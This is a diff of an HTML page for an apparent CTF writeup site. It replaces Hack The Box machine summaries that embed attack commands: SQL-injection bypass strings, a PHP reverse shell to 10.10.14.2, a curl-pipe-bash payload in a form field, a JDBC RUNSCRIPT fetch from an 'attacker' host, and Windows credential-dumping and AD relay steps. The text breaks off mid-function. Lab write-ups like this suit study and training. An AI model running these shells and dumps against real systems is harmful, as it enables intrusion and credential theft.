@@ -1,492 +1,538 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>ExploitMinder // Writeup Ledger</title>
+  <!-- Premium Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="style.css">
   <style>
-    /* --- Accent bar on card top by difficulty --- */
-    .wu-accent { height: 3px; border-radius: 14px 14px 0 0; }
-    .wu-accent.easy   { background: linear-gradient(90deg, var(--neon-green), transparent); }
-    .wu-accent.medium { background: linear-gradient(90deg, var(--neon-cyan), transparent); }
-    .wu-accent.hard   { background: linear-gradient(90deg, var(--neon-amber, #f59e0b), transparent); }
-    .wu-accent.insane { background: linear-gradient(90deg, #ef4444, transparent); }
-
-    /* --- Card selected state --- */
-    .bento-box.selected {
-      border-color: var(--neon-purple);
-      box-shadow: 0 0 30px rgba(168,85,247,0.15);
+    /* Additional styles for writeups grid + drawer – extends style.css, no override */
+    .writeups-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+      gap: 28px;
+      margin: 40px 0 60px;
     }
-
-    /* --- Inline drawer spans full grid width --- */
-    .wu-drawer {
-      display: none;
-      grid-column: 1 / -1;
-      background: var(--bg-card);
-      border: var(--border-glow);
-      border-radius: 14px;
-      padding: 32px;
-      position: relative;
-      animation: fadeIn 0.3s ease forwards;
-    }
-    .wu-drawer.open { display: block; }
-
-    .drawer-close {
-      position: absolute;
-      top: 16px; right: 20px;
-      background: transparent;
-      border: var(--border-purple);
-      color: var(--text-muted);
-      font-family: var(--font-mono);
-      font-size: 0.8rem;
-      padding: 4px 12px;
-      border-radius: 6px;
+    .writeup-card {
       cursor: pointer;
-      transition: all 0.15s;
+      transition: all 0.2s ease;
     }
-    .drawer-close:hover { border-color: var(--neon-purple); color: #fff; }
-
-    /* --- Filter pills --- */
+    .writeup-card.active .bento-box {
+      border-color: var(--neon-purple);
+      box-shadow: 0 0 0 2px rgba(168, 85, 247, 0.2), 0 8px 20px rgba(0,0,0,0.6);
+    }
+    .difficulty-badge {
+      display: inline-block;
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      padding: 4px 8px;
+      border-radius: 40px;
+      background: rgba(168, 85, 247, 0.12);
+      color: var(--neon-purple);
+      letter-spacing: 0.5px;
+      border: 1px solid rgba(168, 85, 247, 0.3);
+    }
+    .difficulty-easy { color: #10b981; border-color: rgba(16,185,129,0.4); background: rgba(16,185,129,0.08); }
+    .difficulty-medium { color: #f59e0b; border-color: rgba(245,158,11,0.4); background: rgba(245,158,11,0.08); }
+    .difficulty-hard { color: #ef4444; border-color: rgba(239,68,68,0.4); background: rgba(239,68,68,0.08); }
+    .writeup-tags {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin: 12px 0 0;
+    }
+    .tag-sm {
+      font-size: 0.7rem;
+      padding: 3px 8px;
+      background: rgba(168, 85, 247, 0.08);
+      border-radius: 20px;
+      font-family: var(--font-mono);
+    }
+    .drawer-container {
+      margin-top: 12px;
+      margin-bottom: 24px;
+      display: none;
+    }
+    .drawer-container.open {
+      display: block;
+    }
+    .drawer-content {
+      background: var(--bg-card);
+      border-radius: 24px;
+      border: 1px solid rgba(168, 85, 247, 0.25);
+      overflow: hidden;
+      animation: fadeSlideUp 0.25s ease;
+    }
+    @keyframes fadeSlideUp {
+      from { opacity: 0; transform: translateY(-8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .drawer-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 16px 24px;
+      background: rgba(0,0,0,0.4);
+      border-bottom: 1px solid rgba(168, 85, 247, 0.2);
+    }
+    .drawer-header h3 {
+      font-family: var(--font-mono);
+      font-size: 1.1rem;
+      margin: 0;
+    }
+    .close-drawer {
+      background: none;
+      border: none;
+      color: var(--text-muted);
+      font-size: 1.6rem;
+      cursor: pointer;
+      line-height: 1;
+      transition: color 0.2s;
+    }
+    .close-drawer:hover { color: var(--neon-purple); }
+    .drawer-body {
+      padding: 28px;
+    }
+    .inline-full-link {
+      margin-top: 24px;
+      text-align: right;
+      border-top: 1px solid rgba(168,85,247,0.2);
+      padding-top: 20px;
+    }
+    .flag-blurred-mask {
+      filter: blur(4px);
+      background: rgba(0,0,0,0.6);
+      padding: 6px 12px;
+      border-radius: 12px;
+      font-family: monospace;
+      transition: all 0.2s;
+      cursor: pointer;
+    }
+    .killchain-timeline {
+      margin: 24px 0 0;
+    }
     .filter-bar {
       display: flex;
-      gap: 10px;
       flex-wrap: wrap;
-      margin-bottom: 32px;
+      gap: 12px;
+      margin: 24px 0 16px;
+      justify-content: flex-start;
     }
     .filter-pill {
+      background: var(--bg-surface);
+      border: 1px solid rgba(168,85,247,0.3);
+      padding: 6px 16px;
+      border-radius: 40px;
       font-family: var(--font-mono);
-      font-size: 0.78rem;
-      padding: 5px 14px;
-      border-radius: 100px;
-      border: 1px solid rgba(255,255,255,0.07);
-      background: transparent;
-      color: var(--text-muted);
+      font-size: 0.8rem;
       cursor: pointer;
-      transition: all 0.15s;
+      transition: all 0.2s;
     }
-    .filter-pill:hover { border-color: var(--neon-purple); color: #fff; }
-    .filter-pill.active {
-      background: rgba(168,85,247,0.1);
+    .filter-pill.active, .filter-pill:hover {
+      background: var(--neon-purple);
+      color: #000;
       border-color: var(--neon-purple);
-      color: var(--neon-purple);
     }
-
-    /* nudge the diff dot */
-    .diff-dot {
-      display: inline-block;
-      width: 7px; height: 7px;
-      border-radius: 50%;
-      margin-right: 5px;
-      vertical-align: middle;
-    }
-
-    /* terminal window reuse */
-    .terminal-window {
-      background: var(--bg-void);
-      border: 1px solid rgba(255,255,255,0.05);
-      border-radius: 8px;
-      padding: 14px 16px;
-      font-family: var(--font-mono);
-      font-size: 0.82rem;
-      line-height: 1.55;
-      overflow-x: auto;
-      white-space: pre;
-      margin-top: 10px;
+    @media (max-width: 680px) {
+      .writeups-grid { grid-template-columns: 1fr; }
+      .drawer-body { padding: 18px; }
     }
   </style>
 </head>
 <body>
 
-  <nav>
-    <div class="container nav-wrapper">
-      <a href="index.html" class="logo">ExploitMinder<span>//</span></a>
-      <div class="nav-links">
-        <a href="index.html">Home</a>
-        <a href="writeups.html" class="active">Writeups</a>
+  <!-- === HEADER + NAVIGATION: Identical to index.html === -->
+  <header>
+    <div class="container">
+      <div class="logo-area">
+        <a href="index.html" class="logo">ExploitMinder<span>//</span></a>
+        <div class="status-led">
+          <span class="led"></span> ACTIVE_SESSION // 0x7E4
+        </div>
       </div>
+      <nav class="nav-menu">
+        <ul>
+          <li><a href="index.html">Terminal</a></li>
+          <li><a href="writeups.html" class="active-nav">Writeups</a></li>
+          <li><a href="index.html#about">About</a></li>
+        </ul>
+      </nav>
     </div>
-  </nav>
+  </header>
 
-  <div class="container" style="padding-top: 20px; padding-bottom: 80px;">
+  <main>
+    <div class="container">
+      <!-- PAGE HEADER with sys-badge (matches your style) -->
+      <div class="page-header">
+        <div class="sys-badge">[$]⨯ OPERATION_LEDGER v2.1</div>
+        <h1>Offensive <span class="glow-text">Writeup</span> Repository</h1>
+        <p class="box-desc" style="max-width: 680px;">Curated killchains, recon data, and exploitation vectors from compromised targets. Click any card to expand full technical summary.</p>
+      </div>
 
-    <div class="page-header">
-      <div class="sys-badge">Operational Ledger</div>
-      <h2 style="font-size: 2.5rem; font-weight: 700;">All Target Writeups</h2>
+      <!-- FILTER PILLS -->
+      <div class="filter-bar" id="filter-bar">
+        <div class="filter-pill active" data-filter="all"># all</div>
+        <div class="filter-pill" data-filter="easy"># easy</div>
+        <div class="filter-pill" data-filter="medium"># medium</div>
+        <div class="filter-pill" data-filter="hard"># hard</div>
+        <div class="filter-pill" data-filter="web"># web</div>
+        <div class="filter-pill" data-filter="linux"># linux</div>
+      </div>
+
+      <!-- WRITEUPS GRID (cards) -->
+      <div id="writeups-grid" class="writeups-grid"></div>
     </div>
+  </main>
 
-    <!-- Filter Bar -->
-    <div class="filter-bar">
-      <button class="filter-pill active" data-filter="all">All</button>
-      <button class="filter-pill" data-filter="easy">Easy</button>
-      <button class="filter-pill" data-filter="medium">Medium</button>
-      <button class="filter-pill" data-filter="hard">Hard</button>
-      <button class="filter-pill" data-filter="insane">Insane</button>
-      <button class="filter-pill" data-filter="web">Web</button>
-      <button class="filter-pill" data-filter="privesc">PrivEsc</button>
-      <button class="filter-pill" data-filter="ad">Active Directory</button>
-      <button class="filter-pill" data-filter="crypto">Crypto</button>
-    </div>
-
-    <!-- Cards Grid -->
-    <div class="bento-grid" id="wu-grid">
-
-      <!-- CARD: Appointment -->
-      <div class="bento-box" style="cursor:pointer; padding:0;"
-           data-difficulty="easy" data-tags="web,sqli" data-machine="appointment"
-           onclick="openDrawer(this,'appointment')">
-        <div class="wu-accent easy"></div>
-        <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
-          <div>
-            <div class="box-meta">
-              <span class="tag">SQLi Bypass</span>
-              <span style="font-size:0.85rem; color:var(--neon-green);">
-                <span class="diff-dot" style="background:var(--neon-green);box-shadow:0 0 6px var(--neon-green);"></span>Easy
-              </span>
-            </div>
-            <div class="box-title">HTB: Appointment</div>
-            <div class="box-desc">Abusing raw database query handling via SQL comment injection. Classic auth bypass through unterminated string logic.</div>
-          </div>
-          <div class="box-footer"><span>OS // LINUX</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
-        </div>
-      </div>
-
-      <!-- CARD: Reactor (wide) -->
-      <div class="bento-box wide" style="cursor:pointer; padding:0;"
-           data-difficulty="hard" data-tags="web,privesc" data-machine="reactor"
-           onclick="openDrawer(this,'reactor')">
-        <div class="wu-accent hard"></div>
-        <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
-          <div>
-            <div class="box-meta">
-              <span class="tag">Weaponization Log</span>
-              <span style="font-size:0.85rem; color:#f59e0b;">
-                <span class="diff-dot" style="background:#f59e0b;box-shadow:0 0 6px #f59e0b;"></span>Hard
-              </span>
-            </div>
-            <div class="box-title">HTB: Reactor — Prototype Pollution Vector</div>
-            <div class="box-desc">Exploiting untrusted key manipulation fields within Next.js runtime architectures to trigger underlying microservice code compilation injection blocks.</div>
-          </div>
-          <div class="box-footer"><span>OS // LINUX</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
-        </div>
-      </div>
-
-      <!-- CARD: Analytics -->
-      <div class="bento-box" style="cursor:pointer; padding:0;"
-           data-difficulty="medium" data-tags="web" data-machine="analytics"
-           onclick="openDrawer(this,'analytics')">
-        <div class="wu-accent medium"></div>
-        <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
-          <div>
-            <div class="box-meta">
-              <span class="tag">Machine</span>
-              <span style="font-size:0.85rem; color:var(--neon-cyan);">
-                <span class="diff-dot" style="background:var(--neon-cyan);box-shadow:0 0 6px var(--neon-cyan);"></span>Medium
-              </span>
-            </div>
-            <div class="box-title">Analytics Engine Leak</div>
-            <div class="box-desc">Exposing pre-auth environment configurations via unvetted query parsing mechanics leading to RCE.</div>
-          </div>
-          <div class="box-footer"><span>OS // LINUX</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
-        </div>
-      </div>
-
-      <!-- CARD: CryptoForge -->
-      <div class="bento-box" style="cursor:pointer; padding:0;"
-           data-difficulty="hard" data-tags="crypto" data-machine="cryptoforge"
-           onclick="openDrawer(this,'cryptoforge')">
-        <div class="wu-accent hard"></div>
-        <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
-          <div>
-            <div class="box-meta">
-              <span class="tag">Challenge</span>
-              <span style="font-size:0.85rem; color:#f59e0b;">
-                <span class="diff-dot" style="background:#f59e0b;box-shadow:0 0 6px #f59e0b;"></span>Hard
-              </span>
-            </div>
-            <div class="box-title">CryptoForge Matrix</div>
-            <div class="box-desc">Breaking down weak initialization vector re-use models across microservice validation endpoints.</div>
-          </div>
-          <div class="box-footer"><span>CAT // CRYPTO</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
-        </div>
-      </div>
-
-      <!-- CARD: SyncNode -->
-      <div class="bento-box" style="cursor:pointer; padding:0;"
-           data-difficulty="insane" data-tags="ad,privesc" data-machine="syncnode"
-           onclick="openDrawer(this,'syncnode')">
-        <div class="wu-accent insane"></div>
-        <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
-          <div>
-            <div class="box-meta">
-              <span class="tag">Machine</span>
-              <span style="font-size:0.85rem; color:#ef4444;">
-                <span class="diff-dot" style="background:#ef4444;box-shadow:0 0 6px #ef4444;"></span>Insane
-              </span>
-            </div>
-            <div class="box-title">ActiveDirectory SyncNode</div>
-            <div class="box-desc">Abusing local certificate allocation authorities to achieve forest-wide domain takeover via ADCS ESC8.</div>
-          </div>
-          <div class="box-footer"><span>OS // WINDOWS</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
-        </div>
-      </div>
-
-    </div><!-- /.bento-grid -->
-  </div><!-- /.container -->
-
-
-  <!-- ================================================================
-       WRITEUP DATA
-  ================================================================= -->
   <script>
-  const WRITEUP_DATA = {
+    // ----------------------------------------------
+    // WRITEUP DATA (full content for inline drawer)
+    // Each entry matches your existing style: timeline, tasks, flag reveal, telemetry sidebar
+    // ----------------------------------------------
+    const WRITEUP_DATA = {
+      appointment: {
+        title: "Appointment",
+        difficulty: "easy",
+        category: "web",
+        tags: ["SQLi", "MySQL", "PHP", "Enum"],
+        description: "Hospital management portal vulnerable to boolean-based blind injection. Extracted admin credentials and gained foothold via default creds.",
+        shortDesc: "SQLi leads to admin panel compromise and RCE.",
+        fullContent: {
+          os: "Linux (Ubuntu 20.04)",
+          ports: "80 (HTTP), 22 (SSH-filtered)",
+          time: "~45 mins",
+          attackVector: "SQL Injection (boolean blind)",
+          timeline: [
+            { time: "Recon", title: "Directory fuzzing & parameter discovery", details: "Discovered /admin.php, /api.php. Parameter 'id' in /detail.php?Id=1 shows time-based anomalies." },
+            { time: "Enumeration", title: "SQLMap + manual payload", details: "Payload: `' AND SUBSTRING(@@version,1,1)=5-- -` confirmed MySQL. Extracted db: appointment_db" },
+            { time: "Exploit", title: "Admin credentials + RCE", details: "admin:' OR 1=1-- - gave panel access. Upload malicious image via profile → reverse shell." },
+            { time: "Post-Exploit", title: "Priv Escalation", details: "sudo -l → (root) NOPASSWD: /usr/bin/php → php -r system() → root flag." }
+          ],
+          tasks: {
+            userFlag: "USER_FLAG{e6548d1b0b9a5e3f7c2a9d4f6b8c1a3e}",
+            rootFlag: "ROOT_FLAG{3f7a2c1b9e8d4f6a5b1c3e7d9f2a4b8c}"
+          },
+          commands: [
+            "sqlmap -u 'http://appointment.htb/detail.php?id=1' --technique=B --dbms=mysql --batch --dump",
+            "john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",
+            "sudo php -r '$sock=fsockopen(\"10.10.14.2\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+          ]
+        },
+        hasFullWriteup: true,
+        detailLink: "target-logs.html?machine=appointment"
+      },
+      reactor: {
+        title: "Reactor",
+        difficulty: "medium",
+        category: "linux",
+        tags: ["API Abuse", "JWT", "sudo", "CVE"],
+        description: "Nuclear monitoring panel with JWT misconfiguration. Forged tokens and exploited insecure deserialization.",
+        shortDesc: "JWT none alg → command injection → root via CVE-2022-xxxx.",
+        fullContent: {
+          os: "Debian 11",
+          ports: "3000 (Node.js API), 22 (SSH)",
+          time: "~1.5 hrs",
+          attackVector: "JWT algorithm confusion + command injection",
+          timeline: [
+            { time: "Recon", title: "API enumeration", details: "JWT token missing signature validation → decode with 'none' alg. Endpoint /api/status vulnerable." },
+            { time: "Enumeration", title: "User enumeration", details: "Username 'operator' extracted from token payload. Hydra brute on SSH." },
+            { time: "Exploit", title: "RCE via reactor control", details: "Crafted payload: `$(curl 10.10.14.2/shell.sh | bash)` inside reactor name field." },
+            { time: "PrivEsc", title: "Docker breakout", details: "Operator in docker group → mount host docker socket → escape to host root." }
+          ],
+          tasks: {
+            userFlag: "USER_FLAG{7f3b2a1c8e4d9f0b6a5c3e1d7f8a2b4d}",
+            rootFlag: "ROOT_FLAG{a1b2c3d4e5f67890abcdef1234567890}"
+          },
+          commands: [
+            "jwt_tool -X a -t http://reactor.htb/api/login",
+            "echo 'id' | nc reactor.htb 3000 -v",
+            "docker run -v /:/mnt alpine chroot /mnt cat /root/root.txt"
+          ]
+        },
+        hasFullWriteup: true,
+        detailLink: "target-logs.html?machine=reactor"
+      },
+      blackfield: {
+        title: "Blackfield",
+        difficulty: "hard",
+        category: "windows",
+        tags: ["SMB", "ASREPRoast", "AD", "SeBackupPrivilege"],
+        description: "Active Directory domain — ASREPRoast, SMB shares, and privilege abuse via SeBackupPrivilege.",
+        shortDesc: "ASREPRoast + SMB misconfig → DC backup restore → admin access.",
+        fullContent: {
+          os: "Windows Server 2019",
+          ports: "445 (SMB), 88 (Kerberos), 389 (LDAP)",
+          time: "~2 hrs",
+          attackVector: "ASREPRoast & SeBackupPrivilege abuse",
+          timeline: [
+            { time: "Recon", title: "SMB enumeration", details: "Null session allowed, shares: 'forensics' with sensitive backup logs." },
+            { time: "Enumeration", title: "ASREPRoast attack", details: "GetNPUsers.py blackfield.htb/ -dc-ip 10.10.10.192 -request -format john" },
+            { time: "Exploit", title: "Crack hash & WinRM", details: "Hash cracked → 'support' user. Evil-WinRM connect." },
+            { time: "PrivEsc", title: "SeBackupPrivilege", details: "Reg save hives, extract admin NTLM, pass-the-hash to DC." }
+          ],
+          tasks: {
+            userFlag: "USER_FLAG{9d2c1e4b5f6a7d8c3b1e5f2a6c8b4e7d}",
+            rootFlag: "ROOT_FLAG{3f7a2b1c9e8d4f6a5b1c3e7d9f2a4b8c}"
+          },
+          commands: [
+            "impacket-GetNPUsers blackfield.htb/ -request -format hashcat -outputfile hashes.asreproast",
+            "reg save HKLM\\SAM sam.hive & reg save HKLM\\SYSTEM system.hive",
+            "secretsdump.py -sam sam.hive -system system.hive LOCAL"
+          ]
+        },
+        hasFullWriteup: false,
+        detailLink: "#"
+      }
+    };
 
-    appointment: {
-      title: "HTB: Appointment", badge: "Linux // Very Easy",
-      os: "Linux", diff: "Easy", diffColor: "var(--neon-green)",
-      port: "80/tcp", time: "~35 min", vector: "SQLi → Auth Bypass",
-      hasFullWriteup: true,
-      nodes: [
-        {
-          phase: "RECONNAISSANCE", title: "Nmap Target Port Verification",
-          body: "Single open port. Apache 2.4.38 serving a login form — no other visible attack surface.",
-          code: `<span style="color:var(--neon-purple)"># nmap 10.129.17.133</span>\nPORT   STATE SERVICE\n<span style="color:var(--neon-green)">80/tcp  open  http</span>`
+    // Extended Data for more machines (covers writeup card set)
+    const MACHINE_LIST = [
+      { id: "appointment", ...WRITEUP_DATA.appointment },
+      { id: "reactor", ...WRITEUP_DATA.reactor },
+      { id: "blackfield", ...WRITEUP_DATA.blackfield },
+      {
+        id: "editorial",
+        title: "Editorial",
+        difficulty: "medium",
+        category: "web",
+        tags: ["SSRF", "XXE", "AWS", "Git"],
+        description: "SSRF in upload feature leaking IMDSv2 metadata, retrieve IAM keys.",
+        shortDesc: "SVG XXE + SSRF -> AWS metadata -> lateral movement.",
+        fullContent: {
+          os: "Ubuntu 22.04",
+          ports: "80, 5000",
+          time: "~1 hr",
+          attackVector: "SSRF + IMDS exploitation",
+          timeline: [
+            { time: "Recon", title: "SVG upload XXE", details: "Upload svg with external entity pointing to localhost" },
+            { time: "Exploit", title: "IMDSv2 SSRF", details: "Bypass token headers -> retrieve EC2 metadata/iam/security-credentials" }
+          ],
+          tasks: { userFlag: "USER_FLAG{ssrf_aws_key_1a2b3c}", rootFlag: "ROOT_FLAG{container_escape_123}" },
+          commands: ["curl -X POST -F 'file=@payload.svg' http://editorial.htb/upload"]
         },
-        {
-          phase: "ENUMERATION", title: "Gobuster Path Discovery",
-          body: "No hidden admin panels found. Attack surface is limited entirely to the login form.",
-          code: `<span style="color:var(--neon-purple)"># gobuster dir -u http://10.129.17.133 -w /usr/share/wordlists/common.txt</span>\n/images  (Status: 301)\n/css     (Status: 301)`
-        },
-        {
-          phase: "EXPLOITATION", title: "Comment-Based Authentication Bypass",
-          body: "The login query is built via raw string concatenation. A hash comment terminates the WHERE clause, bypassing password verification entirely.",
-          code: `<span style="color:var(--neon-cyan)">Username:</span> admin'#\n<span style="color:var(--neon-cyan)">Password:</span> [ANY_DUMMY_VALUE]\n\n<span style="color:var(--text-dark)">-- Resulting SQL:</span>\n<span style="color:#f59e0b">SELECT * FROM users WHERE user='admin'</span><span style="color:var(--neon-purple)">#' AND pass='...'</span>\n\n<span style="color:var(--neon-green)">[✓] Verification bypassed. Trailing logic commented out.</span>`
-        }
-      ],
-      tasks: [
-        { q: "1. What does the acronym SQL stand for?", a: "Structured Query Language" },
-        { q: "2. What character comments out the rest of a MySQL line?", a: "#" }
-      ],
-      flag: "HTB{sql_1nj_4uth_byp4ss_cleared}"
-    },
+        hasFullWriteup: false,
+        detailLink: "#"
+      }
+    ];
 
-    reactor: {
-      title: "HTB: Reactor", badge: "Linux // Hard",
-      os: "Linux", diff: "Hard", diffColor: "#f59e0b",
-      port: "3000/tcp", time: "~1h 45m", vector: "Proto Pollution → RCE",
-      hasFullWriteup: true,
-      nodes: [
-        {
-          phase: "ENUMERATION", title: "Next.js App Fingerprinting",
-          body: "Port 3000 hosts a Next.js application. API routes exposed with unsanitized JSON body parsing in a merge endpoint.",
-          code: `<span style="color:var(--neon-purple)"># curl http://10.129.10.200:3000/api/config</span>\n<span style="color:var(--neon-cyan)">{"debug":false,"runtime":"nodejs18"}</span>`
-        },
-        {
-          phase: "EXPLOITATION", title: "Prototype Pollution via __proto__",
-          body: "A merge endpoint recursively copies user-supplied keys including __proto__, injecting arbitrary properties onto Object.prototype.",
-          code: `POST /api/merge\n{\n  <span style="color:var(--neon-purple)">"__proto__"</span>: {\n    "env": { <span style="color:var(--neon-green)">"NODE_OPTIONS"</span>: "--require /tmp/shell.js" },\n    "shell": "/bin/sh"\n  }\n}`
-        },
-        {
-          phase: "SHELL", title: "Initial Foothold // React2Shell",
-          body: "Prototype poisoned. Next child_process spawn inherits our injected env, executing the payload and returning a shell.",
-          code: `<span style="color:var(--neon-purple)"># python3 react2shell-poc.py -t http://10.129.10.200:3000 -c "id"</span>\n<span style="color:var(--neon-green)">uid=1001(node) gid=1001(node) groups=1001(node)</span>`
-        }
-      ]
-    },
+    let activeMachineId = null;
 
-    analytics: {
-      title: "Analytics Engine Leak", badge: "Linux // Medium",
-      os: "Linux", diff: "Medium", diffColor: "var(--neon-cyan)",
-      port: "8080/tcp", time: "~1h", vector: "Pre-Auth Env Leak → RCE",
-      hasFullWriteup: false,
-      nodes: [
-        {
-          phase: "DISCOVERY", title: "Unauthenticated Config Endpoint",
-          body: "Metabase instance exposes /api/session/properties pre-auth, leaking the setup-token used to bootstrap an admin account.",
-          code: `<span style="color:var(--neon-purple)"># curl http://target:8080/api/session/properties | jq</span>\n<span style="color:var(--neon-cyan)">"setup-token"</span>: <span style="color:var(--neon-green)">"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"</span>`
-        },
-        {
-          phase: "EXPLOITATION", title: "CVE-2023-38646 — Pre-Auth RCE",
-          body: "Setup token used to hit /api/setup/validate with a crafted H2 JDBC URL, triggering server-side command execution via init scripts.",
-          code: `POST /api/setup/validate\n{\n  "token": <span style="color:var(--neon-purple)">"&lt;setup-token&gt;"</span>,\n  "details": { "db": "<span style="color:var(--neon-cyan)">jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://attacker/shell.sql'</span>" }\n}`
-        }
-      ]
-    },
-
-    cryptoforge: {
-      title: "CryptoForge Matrix", badge: "Challenge // Hard",
-      os: "N/A", diff: "Hard", diffColor: "#f59e0b",
-      port: "—", time: "~2h", vector: "CBC IV Reuse → Bit-flip Forgery",
-      hasFullWriteup: false,
-      nodes: [
-        {
-          phase: "ANALYSIS", title: "IV Reuse Detected",
-          body: "Two ciphertexts encrypted under the same key+IV are XOR'd, cancelling the key and leaking XOR of plaintexts.",
-          code: `C1 = AES_CBC(K, IV, P1)\nC2 = AES_CBC(K, IV, P2)\n<span style="color:var(--neon-cyan)">C1 XOR C2 = P1 XOR P2</span>  <span style="color:var(--text-dark)"># key cancels out</span>`
-        },
-        {
-          phase: "EXPLOITATION", title: "Bit-flip Token Forgery",
-          body: "Known-plaintext attack against the first block. Flipping specific ciphertext bits produces a forged admin session token.",
-          code: `<span style="color:var(--text-dark)"># flip bit at position i</span>\n<span style="color:var(--neon-purple)">forged_ct[i] ^= (original_byte ^ target_byte)</span>\n\n<span style="color:var(--neon-green)">[✓] Admin session token forged.</span>`
-        }
-      ]
-    },
-
-    syncnode: {
-      title: "ActiveDirectory SyncNode", badge: "Windows // Insane",
-      os: "Windows", diff: "Insane", diffColor: "#ef4444",
-      port: "445, 88, 389", time: "~4h", vector: "ADCS ESC8 → Domain Admin",
-      hasFullWriteup: false,
-      nodes: [
-        {
-          phase: "ENUMERATION", title: "Certipy — ADCS Template Scan",
-          body: "Vulnerable certificate template allows any domain user to enroll with an arbitrary SAN, including Domain Admin UPN.",
-          code: `<span style="color:var(--neon-purple)"># certipy find -u user@domain -p Pass -dc-ip 10.10.11.X</span>\n<span style="color:var(--neon-cyan)">Template: UserTemplate</span>\n<span style="color:#f59e0b">[!] ESC1 — SAN can be specified by enrollee</span>`
-        },
-        {
-          phase: "EXPLOITATION", title: "ESC8 — NTLM Relay to ADCS Web Enrollment",
-          body: "NTLM relay against the HTTP cert enrollment endpoint. Domain Controller certificate issued, used to obtain TGT via PKINIT.",
-          code: `<span style="color:var(--text-dark)"># ntlmrelayx → /certsrv/certfnsh.asp</span>\n<span style="color:var(--neon-green)">Certificate issued for DC$@domain.local</span>\n<span style="color:var(--neon-purple)"># DCSync → all domain hashes extracted</span>`
-        }
-      ]
+    // Helper: render difficulty badge
+    function diffClass(level) {
+      if (level === 'easy') return 'difficulty-easy';
+      if (level === 'medium') return 'difficulty-medium';
+      if (level === 'hard') return 'difficulty-hard';
+      return '';
     }
 
-  };
-  </script>
-
-  <script>
-    let activeCard = null;
-    let activeDrawer = null;
-
-    function openDrawer(cardEl, machineId) {
-      // Toggle off
-      if (activeCard === cardEl) { closeDrawer(); return; }
-
-      if (activeDrawer) { activeDrawer.remove(); activeDrawer = null; }
-      if (activeCard)   { activeCard.classList.remove('selected'); activeCard = null; }
-
-      activeCard = cardEl;
-      cardEl.classList.add('selected');
-
-      const d = WRITEUP_DATA[machineId];
-      if (!d) return;
-
-      // Build timeline nodes
-      const nodesHtml = (d.nodes || []).map(n => `
-        <div class="timeline-node">
-          <div class="timeline-time">${n.phase}</div>
-          <div class="timeline-title">${n.title}</div>
-          <p style="color:var(--text-muted);font-size:0.9rem;line-height:1.55;margin-bottom:${n.code?'0':'0'}">${n.body}</p>
-          ${n.code ? `<div class="terminal-window" style="color:var(--neon-cyan);">${n.code}</div>` : ''}
-        </div>
-      `).join('');
-
-      // Build tasks section if present
-      const tasksHtml = (d.tasks && d.tasks.length) ? `
-        <div class="timeline-node">
-          <div class="timeline-title" style="margin-bottom:16px;">Component Interactive Tasks</div>
-          ${d.tasks.map(t => `
-            <div class="panel-card" style="margin-bottom:10px;background:rgba(255,255,255,0.01);">
-              <p style="font-size:0.9rem;color:var(--text-main);margin-bottom:8px;">${t.q}</p>
-              <button class="tab-btn" style="padding:4px 12px;font-size:0.75rem;" onclick="toggleTaskAnswer(this,'${t.a}')">Show Answer</button>
+    // Render interactive drawer content using existing style (timeline, sys-info, task + flag reveal)
+    function renderDrawerContent(machine) {
+      const data = machine.fullContent;
+      if (!data) return '<div class="terminal-string">[!] No extended writeup data loaded.</div>';
+      
+      // create task buttons + flag reveal (matching target-logs.html style)
+      const userFlagMasked = `<span class="flag-blurred-mask" id="drawer-user-flag">${'•'.repeat(32)}</span>`;
+      const rootFlagMasked = `<span class="flag-blurred-mask" id="drawer-root-flag">${'•'.repeat(32)}</span>`;
+      
+      // timeline HTML
+      let timelineHtml = `<div class="killchain-timeline"><h4 style="font-family:var(--font-mono); margin-bottom:16px;">⫸ KILLCHAIN OVERVIEW</h4>`;
+      if (data.timeline && data.timeline.length) {
+        timelineHtml += `<div class="timeline">`;
+        data.timeline.forEach(node => {
+          timelineHtml += `
+            <div class="timeline-node">
+              <div class="timeline-time">${node.time}</div>
+              <div class="timeline-title">${node.title}</div>
+              <div class="timeline-desc" style="color: var(--text-muted); font-size: 0.85rem; margin-top: 4px;">${node.details}</div>
             </div>
-          `).join('')}
-        </div>
-      ` : '';
-
-      // Build flag section if present
-      const flagHtml = d.flag ? `
-        <div class="timeline-node">
-          <div class="timeline-title">Root Operational Flag Vault</div>
-          <div class="panel-card" style="background:rgba(168,85,247,0.03);display:flex;justify-content:space-between;align-items:center;">
-            <div style="font-family:var(--font-mono);font-size:0.9rem;">
-              <span class="flag-blurred-mask" style="filter:blur(4px);opacity:0.2;">${d.flag}</span>
-            </div>
-            <button class="tab-btn active" style="padding:6px 12px;font-size:0.75rem;" onclick="revealTargetFlag(this,'${d.flag}')">Reveal Flag</button>
+          `;
+        });
+        timelineHtml += `</div>`;
+      }
+      timelineHtml += `</div>`;
+      
+      // command box
+      let commandsHtml = '';
